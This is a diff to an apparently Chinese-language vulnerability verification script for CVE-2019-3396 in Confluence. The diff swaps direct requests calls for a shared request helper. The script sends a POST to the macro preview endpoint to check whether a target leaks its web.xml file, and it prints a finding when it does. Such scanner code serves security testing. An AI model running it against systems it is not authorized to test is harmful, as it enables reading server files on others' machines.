@@ -6,9 +6,7 @@ description: CVE-2019-3396目录穿越与RCE漏洞,RCE漏洞执行比较麻烦
 '''
 
 import re
-import requests
-import requests.packages.urllib3
-requests.packages.urllib3.disable_warnings()
+from app.lib.utils.request import request
 
 class CVE_2019_3396_BaseVerify:
     def __init__(self, url):
@@ -26,7 +24,7 @@ class CVE_2019_3396_BaseVerify:
         try:
             if not self.url.startswith("http") and not self.url.startswith("https"):
                 self.url = "http://" + self.url
-            req = requests.post(self.url + "/rest/tinymce/1/macro/preview", data = self.data, headers = self.headers, allow_redirects = False, verify = False)
+            req = request.post(self.url + "/rest/tinymce/1/macro/preview", data = self.data, headers = self.headers)
             if req.status_code == 200 and "wiki-content" in req.text:
                 m = re.findall('.*wiki-content">\n(.*)\n            </div>\n', req.text, re.S)
                 print("存在CVE-2019-3396漏洞,可读取web.xml文件内容")
